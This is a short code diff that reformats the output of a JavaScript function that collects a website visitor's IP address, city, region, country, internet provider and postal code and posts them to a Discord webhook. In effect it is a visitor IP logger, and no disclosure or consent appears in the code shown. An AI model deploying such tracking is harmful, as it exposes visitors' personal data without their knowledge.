@@ -5,13 +5,18 @@ async function getIPAndLocationAndSendToDiscord() {
         const data = await response.json();
         
         // Construct the message with content in a code block
-        const message = `\`\`\`Someone visited the website from:\n` +
-                        `- City: ${data.city}\n` +
-                        `- Region: ${data.region}\n` +
-                        `- Country: ${data.country}\n` +
-                        `- Internet provider: ${data.org}\n` +
-                        `- Postal Code: ${data.postal}\n` +
-                        `- IP Address: ${data.ip}\`\`\``;
+        const message = '```json\n' +
+                        JSON.stringify({
+                            "Location": {
+                                "City": data.city,
+                                "Region": data.region,
+                                "Country": data.country,
+                                "Internet provider": data.org,
+                                "Postal Code": data.postal,
+                                "IP Address": data.ip
+                            }
+                        }, null, 2) +
+                        '\n```';
         
         // Send the message to Discord using a webhook
         await sendToDiscord(message);
